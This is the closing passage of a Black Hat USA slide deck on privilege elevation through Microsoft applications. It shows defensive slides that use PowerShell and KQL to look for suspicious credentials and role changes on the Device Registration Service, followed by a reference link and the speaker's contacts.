Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 131

## Looking for suspicious credentials

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Looking for suspicious credentials

PS C:\Temp> (Get-MGServicePrincipal -Filter "AppId eq '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'").KeyCredentials

CustomKeyIdentifier    DisplayName    EndDateTime          Key KeyId                                StartDateTime
-------------------    -----------    -----------          --- -----                                -------------
{84, 101, 115, 116...} CN=com.foo.bar 6/13/2025 8:11:52 PM     c899c5a7-212a-432d-a757-b95f9e7c2936 6/13/2024 8:11:52 PM
{84, 101, 115, 116...} CN=com.foo.bar 6/13/2025 8:11:52 PM     e3fef06b-0a7d-4c86-a87c-8100a50ab1b7 6/13/2024 8:11:52 PM

PS C:\Temp> (Get-MGServicePrincipal -Filter "AppId eq '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9'").PasswordCredentials

CustomKeyIdentifier DisplayName EndDateTime           Hint KeyId                                SecretText StartDateTime
------------------- ----------- -----------           ---- -----                                ---------- -------------
                                10/10/2024 3:04:32 AM LoU  f1546c38-fa8e-44d4-94ba-9258ffe6195c            4/10/2024 3...
                                8/14/2024 7:23:57 PM  sDN  aad0b6fa-99ea-4afa-ad4b-a901d2399413            2/14/2024 8...
                                8/5/2024 11:27:12 PM  /sI  17abf52a-f6f7-434a-9254-7d86b1e5c6a6            2/6/2024 12...

PS C:\Temp>
```

## Slide 132

## Looking for suspicious credentials

Gathering any key (certificate) credentials on Device Registration Service using it’s Client ID

#BHUSA @BlackHatEvents

## Slide 133

## Looking for suspicious credentials

Gathering any secret (password) credentials on Device Registration Service using it’s Client ID

#BHUSA @BlackHatEvents

## Slide 134

## Looking for suspicious activity

Looking for role membership changed initiated by Device Registration Service with KQL in Log Analytics

#BHUSA @BlackHatEvents

## Slide 135

## Looking for suspicious activity

Looking for assignment of credentials to Device Registration Service using KQL in Log Analytics

#BHUSA @BlackHatEvents

## Slide 136

## Article on UnOAuthorized

<u>semperis.com/blog/unoauthorized-privilege-elevation-through-microsoft-applications</u>

#BHUSA @BlackHatEvents

## Slide 137

# Thank you!

@ericonidentity.com

@ericonidentity

/in/ericonidentity

@ericonidentity@infosec.exchange

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat — -
Thank you!
cs @ericonidentity.com in /in/ericonidentity
SX @ericonidentity m @ericonidentity@infosec.exchange
```
